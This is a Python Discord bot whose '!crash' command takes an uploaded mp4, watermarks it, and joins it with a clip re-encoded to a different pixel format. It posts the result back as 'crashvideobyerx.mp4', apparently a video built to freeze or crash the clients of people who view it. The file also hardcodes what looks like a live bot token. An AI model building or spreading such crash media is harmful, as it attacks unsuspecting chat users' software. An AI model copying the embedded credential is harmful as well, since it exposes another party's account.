import sys
import discord
import os
import requests
import subprocess
import ffmpeg
import pathlib
YOUR_BOT_TOKEN = 'Nzc0MDMxNjUzNDk5Njk5MjMx.X6R3Jw.3X3V3ReSRP-27D6l3S3VaP1n3hI' #discord bot token
pathlib.Path().absolute()
client = discord.Client()
@client.event
async def on_ready():
    print('We have logged in as {0.user}'.format(client))
@client.event
async def on_message(message):
    if message.author.bot:
        return
    if message.content.startswith('!crash'):
        if str(message.attachments) == "[]":
            return
        else: 
            split_v1 = str(message.attachments).split("filename='")[1]
            filename = str(split_v1).split("' ")[0]
            if filename.endswith(".mp4"):
                await message.attachments[0].save(fp="uploaded_files/{}".format(filename))
                print('Start')
                if os.path.exists("uploaded_files/uploaded.mp4"):
                    os.remove("uploaded_files/uploaded.mp4")
                os.rename("uploaded_files/" + filename, "uploaded_files/uploaded.mp4")
                subprocess.Popen('ffmpeg -y -i uploaded_files/uploaded.mp4 -vf "drawtext=text=by erx#7733:x=10:y=H-th-10:fontfile=gay.ttf:fontsize=13:fontcolor=white:shadowcolor=black:shadowx=1:shadowy=1" uploaded_files/part1.mp4 && ffmpeg -y -i part2.mp4 -pix_fmt yuv444p part2_new.mp4 && ffmpeg -y -f concat -i test.txt -codec copy uploaded_files/crashvideobyerx.mp4', shell=True).wait()
                await message.channel.send(file=discord.File('uploaded_files/crashvideobyerx.mp4'))

                print("End")
client.run(YOUR_BOT_TOKEN)